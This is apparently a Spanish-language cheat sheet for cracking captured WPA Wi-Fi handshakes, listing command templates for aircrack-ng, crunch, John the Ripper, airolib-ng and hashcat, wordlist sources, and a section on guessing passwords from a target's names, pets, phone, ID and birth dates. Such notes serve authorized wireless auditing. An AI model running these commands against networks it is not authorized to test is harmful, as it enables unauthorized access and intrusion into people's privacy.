# WPACrack

## Requerimientos
- Aircrack-ng
- Crunch
- John
- Handshake

## Generadores
---

### Crunch
```bash
crunch {minCaracteres} {maxCaracteres} "{caracteresAUsar}" -o {nombreArchivo}
```
**Parametros:**

- (@) - minusculas, (,) - mayusculas, (%) - numeros, (^) - simbolos
- -d > Evita que se repitan caracteres en consecutivo usando (@,%^) ej. 2@
- -o > Nombre del archivo a guardar
- -t > patron para generar palabras usando (@,%^)

### Airolib

crear una lista de ESSIDs (los nombres de las redes), llamada {archivoESSIDs}

```bash
echo {nombreRed} >> {archivoESSIDs}
airolib-ng {nombreBD} --import essid {archivoESSIDs}
# Usando diccionario
airolib-ng {nombreBD} --import passwd {archivoClaves}
# Usando Crunch
crunch {minCaracteres} {maxCaracteres} "{caracteresAUsar}" --stdout | airolib-ng {nombreBD} --import passwd -
# Usando John
john -stdout -incremental -session:{nombreSesion} | airolib-ng {nombreBD} --import passwd -
airolib-ng {nombreBD} --batch
airolib-ng {nombreBD} --clean
airolib-ng {nombreBD} --clean all
```

### Ingeniería social

Generar contraseñas con palabras que relacionen al usuario
- **nombre/s** - apodos, abreviados
- **apellido/s** - apodos, abreviados
- **nombre mascotas**
- **numero de identificación** - adicionar 1 o 2 letras o símbolos mas
- **teléfono** - adicionar 1 o 2 letras o símbolos mas
- **fecha de nacimiento** - DDMM, MMDD, YYYY, DDMMYY, DDMMYYYY

### Claves genéricas

- [berzerk0/Probable-Wordlists](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length)
- [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
- [CrackStation](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [hackingyseguridad/diccionarios](https://github.com/hackingyseguridad/diccionarios) 
- [DragonJar](https://www.dragonjar.org/diccionario-claves-wpa-para-realizar-ataques-de-fuerza-bruta.xhtml)

## Proceso
---

### Aircrack con diccionario

```bash
aircrack-ng -w {ruta/nombreDiccionario} -b {macRouter} *.cap
```

### Aircrack con John

**Iniciar sesión de captura**

```bash
john -stdout -incremental -session:{nombreSesion} | aircrack-ng -b {macRouter} -w - {captura}.cap 
```
**Parametros de incremental**

- alnum > letras y numeros
- digits > solo numeros
- alpha > solo lertas
- vacio > letras, numeros y simbolos

[Documentacion](https://www.openwall.com/john/doc/OPTIONS.shtml)

**Restaurar sesión de captura**

```bash
john -restore:{nombreSesion} | aircrack-ng -b {macRouter} -w - {captura}.cap 
```

### Aircrack con Crunch

```bash
crunch {minCaracteres} {maxCaracteres} "{caracteresAUsar}" | aircrack-ng -b {macRouter} -w - {captura}.cap
```

### Aircrack con Airolib

```bash
aircrack-ng  -r {nombreBD} {captura}.cap
```
---
### Hashcat

Convertir .cap en hash [aquí](https://hashcat.net/cap2hashcat/)

### Hashcat con diccionario

```bash
hashcat -m 22000 {nuevoHash}.hc22000 {ruta/nombreDiccionario}
```
### Hashcat fuerza bruta

```bash
hashcat -m 22000 {nuevoHash}.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```
### Hashat usando GPUHASH.me
https://gpuhash.me/